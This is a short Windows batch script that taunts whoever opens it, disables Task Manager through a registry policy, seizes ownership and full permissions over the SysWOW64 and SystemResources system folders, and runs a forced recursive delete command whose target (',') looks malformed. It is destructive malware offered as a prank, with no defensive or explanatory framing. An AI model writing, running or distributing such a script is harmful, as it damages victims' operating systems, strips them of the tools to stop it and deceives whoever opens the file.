@echo "Why the fuck would you open this you absolute buffoon your pc will not be happy with you AT ALL. Also dont even try to task manager your way out of this because i have disabled it :)"
pause
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
takeown /f C:\Windows\SysWOW64 /r /d y
icacls C:\Windows\SysWOW64 /grant administrators:F /t
del /F /S /Q ','
takeown /f C:\Windows\SystemResources /r /d y
icacls C:\Windows\SystemResources /grant administrators:F /t 